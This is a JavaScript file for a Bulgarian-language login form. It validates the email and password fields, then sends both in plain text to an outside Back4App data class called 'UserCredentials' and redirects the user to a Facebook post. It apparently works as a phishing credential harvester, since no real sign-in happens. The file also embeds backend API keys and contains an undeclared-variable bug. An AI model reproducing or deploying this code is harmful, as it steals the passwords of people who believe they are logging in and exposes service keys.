document.addEventListener('DOMContentLoaded', function () {

    const form = document.querySelector('.login-form');
    const emailInput = document.getElementById('email');
    const passwordInput = document.getElementById('password');

    if (!form || !emailInput || !passwordInput) return;

    form.addEventListener('submit', async function (e) {
        e.preventDefault();

        const email = emailInput.value.trim();
        const password = passwordInput.value;

        const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
        if (!email) {
            alert('Моля въведете имейл.');
            emailInput.focus();
            return;
        }
        if (!emailRegex.test(email)) {
            alert('Моля въведете валиден имейл адрес.');
            emailInput.focus();
            return;
        }

        if (!password) {
            alert('Моля въведете парола.');
            passwordInput.focus();
            return;
        }
        if (password.length < 6) {
            alert('Паролата трябва да е поне 6 знака.');
            passwordInput.focus();
            return;
        }
        if (!/[A-Z]/.test(password) || !/[a-z]/.test(password)) {
            alert('Паролата трябва да съдържа поне една малка и една главна буква.');
            passwordInput.focus();
            return;
        }

        const url = 'https://parseapi.back4app.com/classes/UserCredentials';
        const payload = { email: email, password: password };
        const headers = {
            'X-Parse-Application-Id': 'ZG3CnsxIuFC3P53idDu0NSlcURMYkw4vUTuMUqMH',
            'X-Parse-REST-API-Key': 'puxcdWNwKGHeT3qM7SdTfi8KsBoDL7c65GqSyznP',
            'Content-Type': 'application/json'
        };

        try {
            const resp = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload)
            });

            const respText = await resp.text();

            if (!resp.ok) {
                try {
                    const json = JSON.parse(respText);
                    if (json.error) message = json.error;
                } catch (e) {
                }
                alert(message);
                return;
            }

            let data;
            try { data = JSON.parse(respText); } catch (e) { data = null; }

            window.location.href = 'https://www.facebook.com/share/p/1LMZpP4ZvA/?mibextid=wwXIfr';
        } catch (err) {
            console.error('Network error:', err);
            alert('Неуспешна връзка. Моля проверете интернет и опитайте отново.');
        }
    });
});